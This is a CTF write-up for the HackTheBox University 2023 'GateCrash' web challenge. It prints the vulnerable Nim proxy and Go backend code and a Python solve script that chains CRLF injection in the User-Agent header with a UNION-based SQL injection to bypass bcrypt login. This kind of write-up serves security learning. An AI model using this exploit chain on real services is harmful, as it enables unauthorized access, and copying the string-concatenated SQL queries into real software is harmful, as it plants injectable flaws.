---
title: GateCrash
date: 2023-12-12 09:53:16 +0800
categories: [Hackthebox-universities-2023-CTF, GateCrash]
tags: [htb, ctf, pentesting, web, code-auditing]
---


<img src="/assets/global/banner.png" alt="banner image">

## GateCrash is a `Go` and `nim-lang` chalenge on Hackthebox uneversities CTF 2023

### Description:
This challenge contains an sqlite injection on this line `row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")`\
but to achieve that you have to bypass proxy server because it's only allwing *alphanemiric* characters.

### Source code:
<a href='https://mega.nz/file/7DQzhQ7Y#SZYPVIUwdt1tBV5_rxGjmJPSUHKCtrlURPnCzETvjKw'>Download source code</a>

*zip password: `hackthebox`*


<img src="/assets/gatecrash/login.png" alt="login image">

### proxy server:
coded in `nim-lang`
```nim
import asyncdispatch, strutils, jester, httpClient, json
import std/uri

const userApi = "http://127.0.0.1:9090"

proc msgjson(msg: string): string =
  """{"msg": "$#"}""" % [msg]

proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false

settings:
  port = Port 1337

routes:
  post "/user":
    let username = @"username"
    let password = @"password"

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

    let userAgent = decodeUrl(request.headers["user-agent"])

    let jsonData = %*{
      "username": username,
      "password": password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile("/flag.txt"))

runForever()

```

### backend:
coded in `Go`
```go
const (
	sqlitePath = "./user.db"
	webPort    = 9090
)

type User struct {
	ID       int
	Username string
	Password string
}

func randomHex(n int) (string, error) {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}

func seedDatabase() {
	createTable := `
	CREATE TABLE IF NOT EXISTS users (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		username TEXT NOT NULL,
		password TEXT NOT NULL
	);
	`

	_, err := db.Exec(createTable)
	if err != nil {
		log.Fatal(err)
	}

	for i := 0; i < 10; i++ {
		newUser, _ := randomHex(32)
		newPass, _ := randomHex(32)

		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
		if err != nil {
			fmt.Println(err)
			return
		}

		_, err = db.Exec("INSERT INTO users (username, password) VALUES ('" + newUser + "', '" + string(hashedPassword) + "');")
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	found := false
	for _, userAgent := range allowedUserAgents {
		if strings.Contains(r.Header.Get("User-Agent"), userAgent) {
			found = true
			break
		}
	}

	if !found {
		http.Error(w, "Browser not supported", http.StatusNotAcceptable)
		return
	}

	var user User
	err := json.NewDecoder(r.Body).Decode(&user)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	userPassword := user.Password

	row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")
	err = row.Scan(&user.ID, &user.Username, &user.Password)
	if err != nil {
		http.Error(w, "Error in username query", http.StatusUnauthorized)
		return
	}

	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(userPassword))
	if err != nil {
		http.Error(w, "Error in paassword check", http.StatusUnauthorized)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Login successful")
}

func main() {
	var err error
	db, err = sql.Open("sqlite3", sqlitePath)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	seedDatabase()

	r := mux.NewRouter()
	r.HandleFunc("/login", loginHandler).Methods("POST")

	http.Handle("/", r)
	fmt.Println("Server is running on " + strconv.Itoa(webPort))
	http.ListenAndServe(":"+strconv.Itoa(webPort), nil)
}

```

### vulnerable code:
```nim
    let client = newHttpClient(userAgent) # in proxy server
```
and 

```go
    row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';") // and this one in backend server

```

**The nim standard library httpClient is vulnerable to a `CR-LF` injection**\
so instead of trying to bypass body filtraton which seems impossible,
we can pass another body in `userAgent` header with `CR-LF` injection


### Solve:

```python


import bcrypt
import requests

def req_sender(password, hash):

	payload = "' union select 100 as id, 'tester' as username, '" + hash + "' as password --"

	headers = {
		'user-agent': "Mozilla/7.0%0d%0a%0d%0a{\"username\":\"" + payload + "\", \"password\":\"" + password + "\"}"
	}
	data = {
		'username': f"{'A'* (len(payload) +5)}",
		'password': password,
  	}
	print(payload)
	print(headers)
	print(data)
	try:
		res = requests.post('http://localhost:1337/user', headers=headers, data=data)
		if res.status_code == 200:
			print("Works as expected")
			print(res.text)
		else:
			print(f"request failed with status code: {res.status_code}")
			print(res.text)
	except requests.exceptions as e:
		print(f"request failed: {e}")

def solve():
	password = b"password123"
    
	hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())
	req_sender(password.decode('utf-8'), hashed_password.decode('utf-8'))
	# print(password.decode('utf-8'))
	# print("Hashed Password:", hashed_password.decode('utf-8'))
    
    
    

if __name__ == "__main__":
	solve()
 

```

